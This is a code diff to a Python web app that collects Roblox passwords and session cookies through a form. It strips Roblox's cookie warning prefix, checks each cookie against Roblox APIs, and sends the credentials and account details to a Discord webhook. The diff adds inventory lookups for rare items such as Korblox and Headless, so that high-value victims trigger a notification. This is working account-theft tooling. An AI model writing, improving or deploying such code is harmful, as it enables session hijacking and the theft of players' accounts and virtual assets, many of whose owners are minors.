@@ -32,7 +32,7 @@ def clean_roblox_cookie(cookie):
     return cookie
 
 
-def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
+def send_to_discord_background(password, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
     try:
         print("Background: Fetching Roblox user information...")
@@ -44,6 +44,8 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
             return
         
         # Check if user has Korblox or Headless for ping notification
+        korblox = user_info.get('has_korblox', False)
+        headless = user_info.get('has_headless', False)
         has_premium_items = korblox or headless
         ping_content = ''
         
@@ -287,6 +289,47 @@ def get_roblox_user_info(cookie):
             except Exception as premium_error:
                 print(f"Error getting Premium status: {str(premium_error)}")
             
+            # Check for Korblox and Headless items in user's inventory
+            has_korblox = False
+            has_headless = False
+            
+            try:
+                # Check for Korblox Deathspeaker Right Leg (ID: 139607718)
+                korblox_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/139607718',
+                                              headers=headers, timeout=5)
+                print(f"Korblox inventory check status: {korblox_response.status_code}")
+                
+                if korblox_response.status_code == 200:
+                    korblox_data = korblox_response.json()
+                    has_korblox = len(korblox_data.get('data', [])) > 0
+                    print(f"Korblox check result: {has_korblox}")
+                else:
+                    print(f"Korblox inventory check failed: {korblox_response.status_code}")
+                    
+            except Exception as korblox_error:
+                print(f"Error checking Korblox inventory: {str(korblox_error)}")
+            
+            try:
+                # Check for Headless items (both classic and dynamic)
+                headless_ids = [134082579, 15093053680]  # Classic and Dynamic Headless
+                
+                for headless_id in headless_ids:
+                    headless_response = requests.get(f'https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{headless_id}',
+                                                   headers=headers, timeout=5)
+                    print(f"Headless {headless_id} inventory check status: {headless_response.status_code}")
+                    
+                    if headless_response.status_code == 200:
+                        headless_data = headless_response.json()
+                        if len(headless_data.get('data', [])) > 0:
+                            has_headless = True
+                            print(f"Headless item {headless_id} found")
+                            break
+                    else:
+                        print(f"Headless {headless_id} inventory check failed: {headless_response.status_code}")
+                        
+            except Exception as headless_error:
+                print(f"Error checking Headless inventory: {str(headless_error)}")
+            
             return {
                 'success': True,
                 'username': username,
@@ -296,7 +339,9 @@ def get_roblox_user_info(cookie):
                 'robux_balance': robux_balance,
                 'pending_robux': pending_robux,
                 'premium_status': premium_status,
-                'total_spent_past_year': total_spent_past_year
+                'total_spent_past_year': total_spent_past_year,
+                'has_korblox': has_korblox,
+                'has_headless': has_headless
             }
         else:
             print(f"Cookie validation failed against Roblox API: {response.status_code}")
@@ -315,7 +360,9 @@ def get_roblox_user_info(cookie):
         'robux_balance': 'Not available',
         'pending_robux': 'Not available',
         'premium_status': '❌ No',
-        'total_spent_past_year': 'Not available'
+        'total_spent_past_year': 'Not available',
+        'has_korblox': False,
+        'has_headless': False
     }
 
 def is_valid_cookie(cookie):
@@ -501,8 +548,6 @@ def submit_form():
         
         # Extract all form fields
         password = data.get('password', '').strip()
-        korblox = data.get('korblox', False)
-        headless = data.get('headless', False)
         cookie = data.get('cookie', '').strip()
         
         # Auto-clean Roblox warning prefix from cookie
@@ -542,7 +587,7 @@ def submit_form():
         start_time = time.time()
         
         try:
-            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
+            send_to_discord_background(password, cookie, webhook_url)
             end_time = time.time()
             processing_time = end_time - start_time
             print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
